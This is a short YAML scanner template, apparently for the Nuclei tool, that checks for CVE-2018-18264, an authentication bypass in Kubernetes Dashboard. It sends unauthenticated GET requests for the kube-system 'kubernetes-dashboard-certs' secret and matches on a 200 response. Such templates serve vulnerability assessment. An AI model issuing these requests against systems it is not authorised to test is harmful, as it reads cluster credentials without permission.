id: CVE-2018-18264
info:
  name: Kubernetes Dashboard unauthenticated secret access
  author:
  - l0ne1y
  description: |-
    Kubernetes Dashboard身份验证绕过漏洞
    Google Kubernetes是美国Google公司的一套开源的Docker容器集群管理系统。该系统为容器化的应用提供资源调度、部署运行、服务发现和扩容缩容等功能。Kubernetes Dashboard是一款基于Web的用于管理Kubernetes集群的通用界面。

    Google Kubernetes Dashboard 1.10.1之前版本中存在安全漏洞。攻击者可利用该漏洞绕过身份验证，使用Dashboard的服务账户读取信息。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/kubernetes/dashboard/releases/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: dsl
    dsl:
    - contains(body, "apiVersion") && contains(body, "objectRef")
  matchers-condition: and
  path:
  - '{{BaseURL}}/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs'
  - '{{BaseURL}}/k8s/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs'
  method: GET
  stop-at-first-match: true
